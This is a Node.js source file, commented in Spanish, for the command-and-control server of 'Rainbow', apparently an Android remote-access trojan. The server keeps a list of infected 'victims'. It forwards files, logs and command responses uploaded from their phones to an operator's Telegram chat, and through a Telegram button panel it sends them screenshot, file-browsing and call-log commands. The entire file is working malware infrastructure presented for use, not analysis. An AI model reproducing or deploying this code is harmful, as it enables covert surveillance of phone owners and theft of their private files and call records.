const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

/**
 * SERVIDOR C2 RAINBOW - VERSIÓN DE EJECUCIÓN FORZADA
 * Basado en la detección exitosa del dispositivo Xiaomi.
 */

let config = { token: "", id: "" };
try {
    config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
} catch (e) {
    console.error("❌ Error: Configura data.json");
    process.exit(1);
}

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    allowEIO3: true,
    transports: ['websocket', 'polling']
});

const bot = new TelegramBot(config.token, { polling: true });
const victims = new Map();
const userState = new Map();

app.use(express.json());

// Logs para debugging en Railway
app.use((req, res, next) => {
    console.log(`[${new Date().toLocaleTimeString()}] ${req.method} ${req.url}`);
    next();
});

// Recepción de archivos
const upload = multer({ storage: multer.memoryStorage() });
app.post('/upload', upload.single('file'), (req, res) => {
    const devId = req.headers['currenttarget'] || "Desconocido";
    if (req.file) {
        bot.sendDocument(config.id, req.file.buffer, {
            caption: `<b>📦 Archivo de: ${devId}</b>`,
            parse_mode: 'HTML'
        }, { filename: req.file.originalname });
    }
    res.send('ok');
});

// Recepción de textos/logs
app.post('/text', (req, res) => {
    const devId = req.headers['currenttarget'] || "Desconocido";
    const content = req.body.text || JSON.stringify(req.body);
    bot.sendMessage(config.id, `<b>📝 Log [${devId}]:</b>\n<code>${content}</code>`, { parse_mode: 'HTML' });
    res.send('ok');
});

// --- COMUNICACIÓN POR SOCKET ---

io.on('connection', (socket) => {
    const h = socket.handshake.headers;
    const q = socket.handshake.query;
    
    // Identificación según b.smali
    const deviceId = h['currenttarget'] || q['currenttarget'] || socket.id;
    const model = h['model'] || q['model'] || "Android";

    victims.set(deviceId, socket.id);
    console.log(`[+] Dispositivo conectado: ${deviceId}`);

    bot.sendMessage(config.id, `<b>✅ Dispositivo Online</b>\nModelo: ${model}\nID: <code>${deviceId}</code>`, { 
        parse_mode: 'HTML' 
    });

    socket.on('ping', () => socket.emit('pong'));

    socket.on('data', (data) => {
        console.log(`[RECEP] Datos de ${deviceId}:`, data);
        let msg = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
        bot.sendMessage(config.id, `<b>📩 Respuesta:</b>\n<pre>${msg}</pre>`, { parse_mode: 'HTML' });
    });

    socket.on('disconnect', () => {
        console.log(`[-] Dispositivo desconectado: ${deviceId}`);
        victims.delete(deviceId);
        bot.sendMessage(config.id, `<b>❌ Dispositivo Offline</b>\nID: ${deviceId}`);
    });
});

// --- INTERFAZ TELEGRAM ---

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (String(chatId) !== String(config.id)) return;
    const text = msg.text;

    if (text === '/start' || text === '↩️ Volver') {
        userState.delete(chatId);
        return bot.sendMessage(chatId, "<b>✯ Rainbow C2 Panel ✯</b>", {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱 Lista de Víctimas']],
                resize_keyboard: true
            }
        });
    }

    if (text === '📱 Lista de Víctimas') {
        const ids = Array.from(victims.keys());
        if (ids.length === 0) return bot.sendMessage(chatId, "No hay conexiones.");
        const kb = ids.map(id => [id]);
        kb.push(['↩️ Volver']);
        return bot.sendMessage(chatId, "Selecciona dispositivo:", { reply_markup: { keyboard: kb, resize_keyboard: true } });
    }

    if (victims.has(text)) {
        userState.set(chatId, { target: text });
        const actions = [['📸 Foto', '📂 Archivos'], ['📞 Llamadas', '↩️ Volver']];
        return bot.sendMessage(chatId, `📍 Controlando: ${text}`, { reply_markup: { keyboard: actions, resize_keyboard: true } });
    }

    const state = userState.get(chatId);
    if (state && state.target) {
        let cmd = null;
        switch(text) {
            case '📸 Foto': cmd = 'screenshot'; break;
            case '📂 Archivos': cmd = 'file-explorer'; break;
            case '📞 Llamadas': cmd = 'calls'; break;
        }

        if (cmd) {
            const sId = victims.get(state.target);
            if (sId) {
                // ENVÍO DE TRIPLE FORMATO:
                // 1. Como objeto con 'action'
                // 2. Como objeto con 'type'
                // 3. Como String plano (algunas versiones de Rainbow lo prefieren)
                
                const payload = { action: cmd, type: cmd, command: cmd };
                
                io.to(sId).emit('data', payload);
                io.to(sId).emit('data', cmd); // Envío como string plano por si acaso
                
                bot.sendMessage(chatId, `⚡ Comando <b>${cmd}</b> enviado en múltiples formatos.`, { parse_mode: 'HTML' });
            }
        }
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
